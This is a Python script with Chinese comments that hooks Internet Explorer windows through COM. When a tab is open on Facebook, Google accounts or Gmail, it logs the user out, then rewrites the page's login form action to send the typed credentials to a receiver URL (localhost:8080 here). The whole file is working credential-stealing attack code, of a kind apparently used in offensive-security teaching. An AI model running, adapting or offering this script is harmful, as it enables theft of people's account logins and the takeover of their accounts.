import win32com.client
import time
from urllib.parse import urlparse
import urllib

data_receiver="http://localhost:8080/"

target_sites={}
target_sites["www.facebook.com"]={
        "logout_url":None,
        "logout_form":"logout_form",
        "login_form_index":0,
        "owned":False
    }

target_sites["accounts.google.com"]={
        "logout_url":"http://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/Servicelogin%3Fservice%3Dmail",
        "logout_form":None,
        "login_form_index":0,
        "owned":False
    }

#Gmail的多个域名都用同样的配置
target_sites["www.gmail.com"]=target_sites["accounts.google.com"]
target_sites["mail.google.com"]=target_sites["accounts.google.com"]

clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows=win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    #等待浏览器加载完一个页面
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)

    return 

while True:
    for browser in windows:
        print("[*] Get tab from browser.")
        url=urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            print("[*] Found target_sites %s" % url.hostname)
            if target_sites[url.hostname]["owned"]:
                continue
            else:
                #如果有一个URL，我们可以重定向
                if target_sites[url.hostname]["logout_url"]:
                    print("[*] Location to %s." % target_sites[url.hostname]["logout_url"])
                    browser.Navigate(target_sites[url.hostname]["logout_url"])
                    wait_for_browser(browser)

                else:
                    #检索文档中的所有元素
                    full_doc=browser.Document.all

                    #迭代，寻找注销表单
                    for i in full_doc:
                        try:
                            #找到退出登录的表单并提交
                            if i.id == target_sites[url.hostname]["logout_form"]:
                                i.submit()
                                wait_for_browser(browser)


                        except:
                            pass

                #现在来修改登录表单
                try:
                    print("[*] Start Hack!")
                    login_index=target_sites[url.hostname]["login_form_index"]
                    login_page=urllib.parse.quote(browser.LocationUrl)
                    print(login_page)
                    browser.Document.forms[login_index].action="%s%s" % (data_receiver,login_page)
                    target_sites[url.hostname]["owned"]=True
                    print("[*] End Hack!")

                except Exception as e:
                    print(e)
    time.sleep(5)

